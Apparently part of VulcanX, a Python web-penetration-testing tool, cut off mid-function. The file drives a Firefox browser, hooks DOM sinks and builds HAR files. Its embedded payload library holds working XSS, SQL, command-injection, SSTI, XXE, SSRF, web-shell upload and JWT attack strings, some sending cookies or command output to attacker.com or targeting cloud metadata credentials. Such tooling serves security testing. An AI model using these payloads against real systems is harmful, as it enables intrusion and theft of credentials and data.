import time
import json
import base64
import hashlib
import urllib.parse
import datetime

from core.ui_tabs.vulnerabilities_tab import VULNERABILITIES_TAB_JS
from core.ui_tabs.traffic_tab import TRAFFIC_TAB_JS
from core.ui_tabs.forms_tab import FORMS_TAB_JS
from core.ui_tabs.storage_tab import STORAGE_TAB_JS
from core.ui_tabs.map_tab import MAP_TAB_JS
from core.ui_tabs.payloads_tab import PAYLOADS_TAB_JS
from core.ui_tabs.dom_tab import DOM_TAB_JS
from core.ui_tabs.scope_tab import SCOPE_TAB_JS
from core.ui_tabs.vpn_tab import VPN_TAB_JS
from core.ui_tabs.report_tab import REPORT_TAB_JS


try:
    from seleniumwire import webdriver
    _SELENIUM_WIRE_AVAILABLE = True
except ImportError:
    from selenium import webdriver
    _SELENIUM_WIRE_AVAILABLE = False


# ---------------------------------------------------------------------------
# Runtime DOM-sink instrumentation
#
# Static taint analysis (core/engine.py _check_dom_xss_taint) can only prove a
# sink is *reachable*. In manual-browse mode we have a live DOM, so we hook
# the actual sink APIs and log calls that really fire, with a best-effort
# caller stack. This catches dynamically-constructed sinks static analysis
# cannot see (e.g. sinks built via string concatenation/computed member access)
# and confirms which statically-flagged sinks are live.
# ---------------------------------------------------------------------------
DOM_SINK_HOOK_JS = r"""
(function() {
    if (window.__vulcanx_hooked) return;
    window.__vulcanx_hooked = true;
    window.__vulcanx_sink_log = window.__vulcanx_sink_log || [];

    function record(kind, detail) {
        try {
            var stack = (new Error()).stack || '';
            window.__vulcanx_sink_log.push({
                kind: kind,
                detail: String(detail).slice(0, 500),
                url: window.location.href,
                stack: stack.split('\n').slice(1, 5).join(' | ').slice(0, 400),
                t: Date.now()
            });
        } catch (e) {}
    }

    // 1. innerHTML / outerHTML setter hook
    ['innerHTML', 'outerHTML'].forEach(function(prop) {
        try {
            var desc = Object.getOwnPropertyDescriptor(Element.prototype, prop);
            if (!desc || !desc.set) return;
            Object.defineProperty(Element.prototype, prop, {
                get: desc.get,
                set: function(val) {
                    if (typeof val === 'string' && val.length > 0) {
                        record('DOM_SINK_' + prop.toUpperCase(), val);
                    }
                    return desc.set.call(this, val);
                },
                configurable: true
            });
        } catch (e) {}
    });

    // 2. document.write / writeln
    ['write', 'writeln'].forEach(function(fn) {
        try {
            var orig = document[fn];
            document[fn] = function() {
                record('DOM_SINK_DOCUMENT_' + fn.toUpperCase(), Array.prototype.join.call(arguments, ' '));
                return orig.apply(document, arguments);
            };
        } catch (e) {}
    });

    // 3. eval
    try {
        var origEval = window.eval;
        window.eval = function(src) {
            record('DOM_SINK_EVAL', src);
            return origEval(src);
        };
    } catch (e) {}

    // 4. Function constructor (dynamic code gen)
    try {
        var OrigFunction = window.Function;
        window.Function = function() {
            record('DOM_SINK_FUNCTION_CTOR', Array.prototype.join.call(arguments, ' | '));
            return OrigFunction.apply(this, arguments);
        };
        window.Function.prototype = OrigFunction.prototype;
    } catch (e) {}

    // 5. setTimeout/setInterval with string argument (implicit eval)
    ['setTimeout', 'setInterval'].forEach(function(fn) {
        try {
            var orig = window[fn];
            window[fn] = function(handler) {
                if (typeof handler === 'string') {
                    record('DOM_SINK_' + fn.toUpperCase() + '_STRING', handler);
                }
                return orig.apply(window, arguments);
            };
        } catch (e) {}
    });

    // 6. postMessage listeners receiving untrusted-origin data with no origin check
    try {
        var origAdd = window.addEventListener;
        window.addEventListener = function(type, listener, opts) {
            if (type === 'message') {
                var src = String(listener).slice(0, 300);
                if (src.indexOf('event.origin') === -1 && src.indexOf('e.origin') === -1) {
                    record('POSTMESSAGE_NO_ORIGIN_CHECK', src);
                }
            }
            return origAdd.call(window, type, listener, opts);
        };
    } catch (e) {}
})();
"""


WIDGET_INIT_JS_PART_1 = r"""
(function() {
    try {
        var w = document.getElementById('vulcanx-widget');
        if (!w) {
            // Create CSS Stylesheet dynamically
            var style = document.createElement('style');
            style.innerHTML = `
                #vulcanx-widget * { box-sizing: border-box; }
                .vx-header { background: #1a1a24; cursor: move; user-select: none; }
                .vx-tab-btn.active { border-bottom: 2px solid #ff0055 !important; color: #ff0055 !important; }
                .vx-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
                .vx-table th, .vx-table td { border: 1px solid #333; padding: 6px 8px; text-align: left; word-break: break-all; }
                .vx-table th { background: #151520; color: #aaa; }
                .vx-table tr:hover { background: rgba(255,255,255,0.03); }
                .vx-finding-details { background: #1c1c28; border-left: 2px solid #ff0055; margin: 5px 0; padding: 10px; font-size: 11px; border-radius: 0 4px 4px 0; }
                .vx-badge { padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; }
                .vx-badge-critical { background: #ff0055; color: #fff; }
                .vx-badge-high { background: #ff5500; color: #fff; }
                .vx-badge-medium { background: #ffcc00; color: #000; }
                .vx-badge-low { background: #00ccff; color: #000; }
                .vx-badge-info { background: #888; color: #fff; }
            `;
            document.head.appendChild(style);

            w = document.createElement('div');
            w.id = 'vulcanx-widget';
            w.style.position = 'fixed';
            w.style.bottom = '20px';
            w.style.right = '20px';
            w.style.width = '485px';
            w.style.height = '420px';
            w.style.resize = 'both';
            w.style.overflow = 'hidden';
            w.style.backgroundColor = 'rgba(15, 15, 22, 0.95)';
            w.style.color = '#e2e2e9';
            w.style.border = '1px solid rgba(255, 0, 85, 0.4)';
            w.style.borderRadius = '10px';
            w.style.zIndex = '2147483647';
            w.style.fontFamily = 'monospace';
            w.style.fontSize = '12px';
            w.style.boxShadow = '0 10px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255,0,85,0.15)';
            w.style.display = 'flex';
            w.style.flexDirection = 'column';

            // Drag handler
            var header = document.createElement('div');
            header.className = 'vx-header';
            header.style.display = 'flex';
            header.style.justifyContent = 'space-between';
            header.style.alignItems = 'center';
            header.style.padding = '10px 15px';
            header.style.borderBottom = '1px solid #333';
            
            var title = document.createElement('strong');
            title.innerText = 'VULCANX HUD';
            title.style.color = '#ff0055';
            title.style.letterSpacing = '1px';
            header.appendChild(title);

            var controlGroup = document.createElement('div');
            controlGroup.style.display = 'flex';
            controlGroup.style.alignItems = 'center';

            var minBtn = document.createElement('button');
            minBtn.innerText = '_';
            minBtn.style.background = '#2a2a35';
            minBtn.style.color = '#fff';
            minBtn.style.border = 'none';
            minBtn.style.padding = '3px 8px';
            minBtn.style.borderRadius = '4px';
            minBtn.style.cursor = 'pointer';
            minBtn.onclick = function() {
                var bodyEl = document.getElementById('vulcanx-body');
                if (bodyEl.style.display === 'none') {
                    bodyEl.style.display = 'flex';
                    w.style.height = '420px';
                } else {
                    bodyEl.style.display = 'none';
                    w.style.height = '40px';
                }
            };
            controlGroup.appendChild(minBtn);

            header.appendChild(controlGroup);
            w.appendChild(header);

            // Drag implementation
            var isDragging = false;
            var startX, startY, initialLeft, initialTop;
            header.onmousedown = function(e) {
                if (e.target.tagName === 'BUTTON') return;
                isDragging = true;
                startX = e.clientX;
                startY = e.clientY;
                initialLeft = w.offsetLeft;
                initialTop = w.offsetTop;
                document.onmousemove = function(e) {
                    if (!isDragging) return;
                    var dx = e.clientX - startX;
                    var dy = e.clientY - startY;
                    w.style.left = (initialLeft + dx) + 'px';
                    w.style.top = (initialTop + dy) + 'px';
                    w.style.bottom = 'auto';
                    w.style.right = 'auto';
                };
                document.onmouseup = function() {
                    isDragging = false;
                    document.onmousemove = null;
                };
            };

            // Main body
            var bodyEl = document.createElement('div');
            bodyEl.id = 'vulcanx-body';
            bodyEl.style.flex = '1';
            bodyEl.style.display = 'flex';
            bodyEl.style.flexDirection = 'column';
            bodyEl.style.overflow = 'hidden';

            // Tab bar
            var tabBar = document.createElement('div');
            tabBar.style.display = 'flex';
            tabBar.style.background = '#11111a';
            tabBar.style.borderBottom = '1px solid #222';
            
            var tabs = ['vulnerabilities', 'traffic', 'forms', 'storage', 'map', 'payloads', 'dom', 'scope', 'vpn', 'report'];
            var tabLabels = ['Findings', 'Traffic', 'Forms', 'Storage', 'LinkMap', 'Payloads', 'DOM Sinks', 'Scope', 'VPN', 'Report'];
            tabs.forEach(function(tab, index) {
                var btn = document.createElement('button');
                btn.className = 'vx-tab-btn';
                if (index === 0) btn.className += ' active';
                btn.innerText = tabLabels[index];
                btn.style.flex = '1';
                btn.style.background = 'none';
                btn.style.border = 'none';
                btn.style.color = '#888';
                btn.style.padding = '8px 4px';
                btn.style.cursor = 'pointer';
                btn.style.fontSize = '11px';
                btn.style.fontWeight = 'bold';
                btn.style.textTransform = 'uppercase';
                btn.onclick = function() {
                    Array.from(tabBar.children).forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    window.__vulcanx_state.activeTab = tab;
                    window.__vulcanx_render();
                };
                tabBar.appendChild(btn);
            });
            bodyEl.appendChild(tabBar);

            // Container
            var contentContainer = document.createElement('div');
            contentContainer.id = 'vulcanx-content-pane';
            contentContainer.style.flex = '1';
            contentContainer.style.overflowY = 'auto';
            contentContainer.style.padding = '12px';
            bodyEl.appendChild(contentContainer);

            // Top level tab bar
            var topTabBar = document.createElement('div');
            topTabBar.style.display = 'flex';
            topTabBar.style.borderBottom = '1px solid #333';
            topTabBar.style.backgroundColor = '#141414';

            var tabFindings = document.createElement('div');
            tabFindings.innerText = 'RAW FINDINGS';
            tabFindings.id = 'vulcanx-tab-findings';
            tabFindings.style.padding = '6px 12px';
            tabFindings.style.cursor = 'pointer';
            tabFindings.style.color = '#ff5555';
            tabFindings.style.borderBottom = '2px solid #ff0000';
            tabFindings.style.fontWeight = 'bold';

            var tabSuggest = document.createElement('div');
            tabSuggest.innerText = 'SUGGESTIONS';
            tabSuggest.id = 'vulcanx-tab-suggest';
            tabSuggest.style.padding = '6px 12px';
            tabSuggest.style.cursor = 'pointer';
            tabSuggest.style.color = '#888';
            tabSuggest.style.borderBottom = '2px solid transparent';
            tabSuggest.style.fontWeight = 'bold';

            var suggestList = document.createElement('div');
            suggestList.id = 'vulcanx-suggest-list';
            suggestList.style.flex = '1';
            suggestList.style.overflowY = 'auto';
            suggestList.style.padding = '10px';
            suggestList.style.display = 'none';
            suggestList.style.background = '#0a0a0f';

            function activateTopTab(which) {
                if (which === 'findings') {
                    bodyEl.style.display = 'flex'; suggestList.style.display = 'none';
                    tabFindings.style.color = '#ff5555'; tabFindings.style.borderBottom = '2px solid #ff0000';
                    tabSuggest.style.color = '#888'; tabSuggest.style.borderBottom = '2px solid transparent';
                } else {
                    bodyEl.style.display = 'none'; suggestList.style.display = 'block';
                    tabSuggest.style.color = '#e0b3ff'; tabSuggest.style.borderBottom = '2px solid #aa55ff';
                    tabFindings.style.color = '#888'; tabFindings.style.borderBottom = '2px solid transparent';
                }
            }
            tabFindings.onclick = function() { activateTopTab('findings'); };
            tabSuggest.onclick = function() { activateTopTab('suggest'); };

            topTabBar.appendChild(tabFindings);
            topTabBar.appendChild(tabSuggest);
            w.appendChild(topTabBar);
            
            w.appendChild(bodyEl);
            w.appendChild(suggestList);
            document.body.appendChild(w);

            window.__vulcanx_state = {
                findings: [],
                traffic: [],
                activeTab: 'vulnerabilities',
                highlighting: false,
                domSinks: [],
                scope: [],
                engagementNotes: '',
                payloads: {
                    xss: [
                        "'\",`", "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>",
                        "<svg onload=alert(1)>", "<img src=x onerror=alert(document.cookie)>", "<svg/onload=alert`1`>", "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
                        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
                        "javascript:alert(document.domain)", "<a href=javascript:alert(1)>click</a>", "'-alert(1)-'", "\";alert(1)//",
                        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                        "<script>document.location='https://attacker.com?c='+document.cookie</script>", "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>"
                    ],
                    sqli: [
                        "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)--",
                        "' AND 1=1--", "' AND 1=2--", "1 OR 1=1", "' OR ''='", "'; EXEC xp_cmdshell('id')--", "1; WAITFOR DELAY '0:0:5'--",
                        "' UNION SELECT username,password FROM users--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "' ORDER BY 1--", "' GROUP BY 1--", "' HAVING 1=1--"
                    ],
                    ssti: [
                        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "{{'7'*7}}",
                        "{{config}}", "{{config.items()}}", "{{''.__class__.__mro__[2].__subclasses__()}}", "{{request.environ}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
                        "{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if x.__name__=='Popen'%}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}",
                        "${\"freemarker.template.utility.Execute\"?new()('id')}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                        "@(1+1)", "*{7*7}", "${{7*7}}", "#{7*7}"
                    ],
                    cmdi: [
                        "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)", "; whoami",
                        "| whoami", "; cat /etc/passwd", "| cat /etc/passwd", "; ls -la", "\n/usr/bin/id", "\r\n/usr/bin/id",
                        "; ping -c 1 attacker.com", "; curl http://attacker.com/$(whoami)", "$(curl http://attacker.com)", "`curl http://attacker.com`",
                        ";{cat,/etc/passwd}", ";cat${IFS}/etc/passwd", ";c'a't${IFS}/etc/passwd", "%0a/usr/bin/id"
                    ],
                    lfi: [
                        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
                        "....//....//etc/passwd", "..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd",
                        "..%c0%afetc%c0%afpasswd", "../etc/passwd%00", "../etc/passwd%00.jpg", "php://filter/convert.base64-encode/resource=index.php",
                        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "expect://id", "/proc/self/environ",
                        "/proc/self/cmdline", "/etc/shadow", "/etc/hosts", "C:\\Windows\\win.ini"
                    ],
                    xxe: [
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;%send;]><foo/>",
                        "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
                        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
                        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
                        "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
                    ],
                    ssrf: [
                        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://metadata.google.internal/computeMetadata/v1/", "http://100.100.100.200/latest/meta-data/",
                        "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/", "http://[::1]/",
                        "http://0177.0.0.1/", "http://0x7f000001/", "http://2130706433/", "http://127.1/",
                        "http://127.0.0.1.nip.io/", "http://localtest.me/", "http://127.0.0.1:22", "http://127.0.0.1:3306",
                        "http://127.0.0.1:5432", "http://127.0.0.1:6379", "http://127.0.0.1:8080", "http://127.0.0.1:9200",
                        "http://127.0.0.1:27017", "dict://127.0.0.1:11211/stat", "file:///etc/passwd", "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                        "ftp://attacker.com/test", "http://attacker.com@127.0.0.1/", "http://127.0.0.1%20@attacker.com/"
                    ],
                    nosqli: [
                        "{\"$gt\": \"\"}", "{\"$ne\": null}", "{\"$regex\": \".*\"}", "{\"$where\": \"1==1\"}",
                        "' || '1'=='1", "'; return true; var a='", "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "{\"$or\": [{}, {\"a\": \"a\"}]}",
                        "true, $where: '1 == 1'", ", $where: '1 == 1'", "$where: function(){return true}", "{\"$gt\": \"\", \"$lt\": \"z\"}",
                        "[$ne]=1", "[%24ne]=1", "[$regex]=.*", "[%24gt]="
                    ],
                    ldapi: [
                        "*", "*)(uid=*))(|(uid=*", "admin*", "admin)(|(&",
                        ")(|(!(cn=*)))", "*)((|userPassword=*)", "*(|(objectclass=*))", "*)",
                        "*&", ")(|(password=*))(|(uid=*", "*)(|(cn=*)", "*)(uid=*)(|(cn=*",
                        "admin)(&)", "admin)(!(&(1=0)))", "*)(objectClass=*", "\\2a",
                        "\\28\\2a\\29", "\\00"
                    ],
                    open_redirect: [
                        "//attacker.com", "https://attacker.com", "http://attacker.com", "@attacker.com",
                        "https:attacker.com", "http:attacker.com", "/\\attacker.com", "\\\\attacker.com",
                        "/%09/attacker.com", "/%5cattacker.com", "///attacker.com", "////attacker.com",
                        "https://example.com%40attacker.com", "https://attacker.com%23@example.com", "https://example.com.attacker.com", "%2F%2Fattacker.com",
                        "https%3A%2F%2Fattacker.com", "javascript:alert(document.domain)", "data:text/html,<script>alert(1)</script>"
                    ],
                    crlf: [
                        "%0D%0ASet-Cookie:crlf=injection", "%0D%0ALocation:https://attacker.com", "%0D%0A%0D%0A<script>alert(1)</script>", "\\r\\nSet-Cookie:crlf=injection",
                        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection", "%250D%250ASet-Cookie:crlf=injection", "%25%30%64%25%30%61Set-Cookie:crlf=injection", "%0aX-Injected:header",
                        "%0dX-Injected:header", "%0d%0aX-Injected:header", "vulcanx\\r\\nX-Injected-Header:value"
                    ],
                    csp_bypass: [
                        "\"><script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>",
                        "\"><script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js\"></script><div ng-app>{{$eval.constructor('alert(1)')()}}</div>",
                        "{{constructor.constructor('alert(1)')()}}", "{{$on.constructor('alert(1)')()}}",
                        "{{a='constructor';b={};b[a]('alert(1)')()}}", "\"><script src=\"data:text/javascript,alert(1)\"></script>",
                        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "\"><base href=\"https://attacker.com\">",
                        "\"><script nonce=VULCANX_NONCE>alert(1)</script>", "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject></svg>",
                        "<link rel=dns-prefetch href=//attacker.com>", "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.com\">",
                        "eval('alert(1)')", "setTimeout('alert(1)', 500)", "Function('alert(1)')()"
                    ],
                    prototype_pollution: [
                        "__proto__[admin]=true", "__proto__[isAdmin]=true", "constructor[prototype][admin]=true", "__proto__[polluted]=vulcanx",
                        "{\"__proto__\":{\"admin\":true}}", "{\"constructor\":{\"prototype\":{\"admin\":true}}}", "{\"__proto__\":{\"isVip\":true}}", "{\"__proto__\":{\"role\":\"admin\"}}",
                        "?__proto__[admin]=1", "?__proto__.admin=1", "?constructor.prototype.admin=1", "{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');x\"}}",
                        "{\"a\":1,\"__proto__\":{\"b\":2}}"
                    ],
                    jwt: [
                        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "eyJhbGciOiJOT05FIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/jwks.json\"}",
                        "{\"alg\":\"RS256\",\"x5u\":\"https://attacker.com/cert.pem\"}", "x' UNION SELECT 'vulcanx_secret'-- -", "../../../dev/null", "../../../../../../etc/passwd",
                        "{\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}"
                    ],
                    graphql: [
                        "{__schema{types{name}}}", "{__schema{queryType{name},mutationType{name}}}", "{__type(name:\"User\"){fields{name type{name}}}}", "{user(id:\"1 OR 1=1\"){id name email}}",
                        "{user(id:\"1; SLEEP(5)\"){id name}}", "{user(id:1){id name email password}}", "{user(id:2){id name email password}}", "{__type(name:\"Query\"){fields{name args{name}}}}",
                        "{a{a{a{a{a{a{a{a{a{a{id}}}}}}}}}}}", "{u1:user(id:1){id} u2:user(id:2){id} u3:user(id:3){id}}", "mutation{login(username:\"admin' OR 1=1--\",password:\"x\"){token}}"
                    ],
                    path_traversal: [
                        "../", "../../", "../../../../", "../etc/passwd",
                        "../../etc/passwd", "../../../../etc/passwd", "../../etc/passwd%00", "../etc/passwd%00.jpg",
                        "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd", "..%c0%afetc%c0%afpasswd", "\\\\attacker.com\\share",
                        "..\\..\\windows\\win.ini", "..%5C..%5Cwindows%5Cwin.ini", "file.txt/../../../etc/passwd", "./././././././././././././etc/passwd"
                    ],
                    upload_bypass: [
                        "shell.php", "shell.php5", "shell.php7", "shell.phtml",
                        "shell.pht", "shell.shtml", "shell.php.jpg", "shell.jpg.php",
                        "shell.PHP", "shell.PhP", "shell.php.png", "shell.php.gif",
                        "shell.asp;.jpg", "shell.php%00.jpg", "shell.asp%00.jpg", "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
                        "<html><script>alert(document.domain)</script></html>", "GIF89a; <?php system($_GET['cmd']); ?>", "shell.asp::$DATA", "../../../etc/cron.d/shell.php",
                        "../../var/www/html/shell.php"
                    ]
                }
            };
        }

        // Functions for rendering and features
        window.__vulcanx_render = function() {
            var container = document.getElementById('vulcanx-content-pane');
            if (!container) return;
            var tab = window.__vulcanx_state.activeTab;

            """

WIDGET_INIT_JS_PART_2 = r"""
        };

        window.__vulcanx_toggle_inputs = function() {
            var inputs = document.querySelectorAll('input:not([type="hidden"]), textarea');
            inputs.forEach(input => {
                if (window.__vulcanx_state.highlighting) {
                    input.setAttribute('data-vx-border', input.style.border || '');
                    input.style.border = '2px dashed #ff0055';
                    input.style.boxShadow = '0 0 10px rgba(255, 0, 85, 0.4)';
                } else {
                    var oldBorder = input.getAttribute('data-vx-border') || '';
                    input.style.border = oldBorder;
                    input.style.boxShadow = '';
                }
            });
        };
    } catch(e) {}
})();
"""

DOM_SINK_DRAIN_JS = """
if (window.__vulcanx_sink_log && window.__vulcanx_sink_log.length > 0) {
    var out = window.__vulcanx_sink_log;
    window.__vulcanx_sink_log = [];
    return out;
}
return [];
"""


class ScopeFilter:
    """
    Restricts analysis to the target's registrable domain (+ optional extra
    hosts the user explicitly adds, e.g. an API subdomain or CDN that's
    actually in scope). Out-of-scope traffic (analytics, ad tech, unrelated
    third parties) is never decoded or scanned, which keeps findings clean
    and avoids wasting cycles on noise.
    """

    def __init__(self, start_url, extra_hosts=None):
        self.root_host = self._registrable(urllib.parse.urlparse(start_url).hostname or '')
        self.extra_hosts = set()
        for h in (extra_hosts or []):
            h = h.strip().lower()
            if h:
                self.extra_hosts.add(h)

    @staticmethod
    def _registrable(hostname):
        """Best-effort eTLD+1 without external deps: last two labels, with a
        small list of common multi-part public suffixes handled explicitly."""
        if not hostname:
            return ''
        hostname = hostname.lower()
        multi_part_suffixes = ('co.uk', 'org.uk', 'gov.uk', 'co.in', 'com.au',
                                'co.jp', 'com.br', 'co.nz')
        for suf in multi_part_suffixes:
            if hostname.endswith('.' + suf):
                parts = hostname.split('.')
                return '.'.join(parts[-3:]) if len(parts) >= 3 else hostname
        parts = hostname.split('.')
        return '.'.join(parts[-2:]) if len(parts) >= 2 else hostname

    def in_scope(self, url):
        try:
            host = (urllib.parse.urlparse(url).hostname or '').lower()
        except Exception:
            return False
        if not host:
            return False
        if host in self.extra_hosts:
            return True
        return self._registrable(host) == self.root_host


class HARBuilder:
    """Accumulates request/response pairs and emits a HAR 1.2 document so a
    manual-browse session can be replayed via --har or imported into Burp."""

    def __init__(self, page_url):
        self.entries = []
        self.page_url = page_url
        self.start_time = datetime.datetime.utcnow()

    def add(self, request):
        try:
            req_headers = [{'name': k, 'value': v} for k, v in dict(request.headers).items()]
            resp = request.response
            resp_headers = [{'name': k, 'value': v} for k, v in dict(resp.headers).items()] if resp else []
            body_text = ''
            if resp is not None and resp.body:
                try:
                    body_text = resp.body.decode('utf-8', errors='ignore')
                except Exception:
                    body_text = ''
            req_body_text = ''
            if request.body:
                try:
                    req_body_text = request.body.decode('utf-8', errors='ignore')
                except Exception:
                    req_body_text = ''

            entry = {
                'startedDateTime': self.start_time.isoformat() + 'Z',
                'time': 0,
                'request': {
                    'method': request.method,
                    'url': request.url,
                    'httpVersion': 'HTTP/1.1',
                    'headers': req_headers,
                    'queryString': [],
                    'cookies': [],
                    'headersSize': -1,
                    'bodySize': len(req_body_text),
                    'postData': {'mimeType': dict(request.headers).get('Content-Type', ''),
                                 'text': req_body_text} if req_body_text else {}
                },
                'response': {
                    'status': resp.status_code if resp else 0,
                    'statusText': resp.reason if resp else '',
                    'httpVersion': 'HTTP/1.1',
                    'headers': resp_headers,
                    'cookies': [],
                    'content': {
                        'size': len(body_text),
                        'mimeType': dict(resp.headers).get('Content-Type', '') if resp else '',
                        'text': body_text
                    },
                    'redirectURL': '',
                    'headersSize': -1,
                    'bodySize': len(body_text)
                },
                'cache': {},
                'timings': {'send': 0, 'wait': 0, 'receive': 0}
            }
            self.entries.append(entry)
        except Exception:
            pass

    def save(self, filepath):
        har = {
            'log': {
                'version': '1.2',
                'creator': {'name': 'VulcanX', 'version': '2.0'},
                'pages': [{
                    'startedDateTime': self.start_time.isoformat() + 'Z',
                    'id': 'page_1',
                    'title': self.page_url,
                    'pageTimings': {}
                }],
                'entries': self.entries
            }
        }
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(har, f, indent=2)


class LiveBrowserInterceptor:
    def __init__(self, analyzer, scope_extra=None, har_out=None, dom_sinks=True):
        self.tls_checked_hosts = set()
        self.analyzer = analyzer
        self.driver = None
        self.running = False
        self.processed_requests = set()
        self.processed_request_bodies = set()
        self.live_findings = []
        self.live_traffic = []
        self.live_hypotheses = []
        from core.correlate import CorrelationEngine
        self.correlator = CorrelationEngine()
        self.current_url = ""
        self.last_seen_url = ""
        self.scope = None
        self.scope_extra = scope_extra or []
        self.har = None
        self.har_out = har_out
        self.dom_sinks_enabled = dom_sinks
        self.tor_enabled = False

    def start(self, start_url):
        if not _SELENIUM_WIRE_AVAILABLE:
            print("[!] WARNING: selenium-wire is not available on this Python version (likely Python 3.14+).")
            print("[!] VulcanX is falling back to standard Selenium. Network Traffic tracking will be disabled, but DOM tracking and HUD will work perfectly.")

        print("[*] Launching Live Browser Mode (using Firefox)...")
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        from selenium.webdriver.firefox.service import Service as FirefoxService
        from webdriver_manager.firefox import GeckoDriverManager

        self.scope = ScopeFilter(start_url, extra_hosts=self.scope_extra)
        self.har = HARBuilder(start_url) if self.har_out else None

        opts = FirefoxOptions()
        # We don't use headless because this is the manual browse mode
        opts.set_preference("devtools.netmonitor.enabled", True)
        opts.set_preference("devtools.netmonitor.persistlog", True)
        opts.set_preference("network.http.phishy-userpass-length", 255)

        try:
            service = FirefoxService(GeckoDriverManager().install())
            self.driver = webdriver.Firefox(service=service, options=opts)
        except Exception as e:
            print(f"[-] Could not find or install GeckoDriver. Error: {e}")
            return

        print("[+] Live Browser launched! Please log in and browse the application naturally.")
        print(f"[*] Scope: *.{self.scope.root_host}" + (f" + {len(self.scope_extra)} extra host(s)" if self.scope_extra else ""))
        if self.dom_sinks_enabled:
            print("[*] Runtime DOM-sink instrumentation: ENABLED (innerHTML/eval/document.write/Function/setTimeout/postMessage)")
        if self.har_out:
            print(f"[*] HAR export on stop: {self.har_out}")
        print("[*] VulcanX is actively intercepting and analyzing traffic in the background...")

        def interceptor(request):
            import urllib.request, ssl, re, zipfile, io, shutil, json, subprocess, os

            if '/api/clear_traffic' in request.url and request.method == 'POST':
                self.live_traffic.clear()
                self.processed_requests.clear()
                # Clear analyzer scanned URLs cache so future traffic is rescanned
                self.analyzer.scanned_urls = set()
                request.create_response(200, headers={'Content-Type': 'application/json'}, body=b'{"status":"ok"}')
                return

            if '/api/clear_findings' in request.url and request.method == 'POST':
                self.live_findings.clear()
                self.live_hypotheses.clear()
                
                # Re-initialize Correlator and Analyzer to clear memory of past findings
                from core.correlate import CorrelationEngine
                self.correlator = CorrelationEngine()
                
                # Reset analyzer deduplication cache
                self.analyzer.findings = []
                self.analyzer.scanned_urls = set()

                request.create_response(200, headers={'Content-Type': 'application/json'}, body=b'{"status":"ok"}')
                return

            if '/api/vpn' in request.url and request.method == 'POST':
                import json
                try:
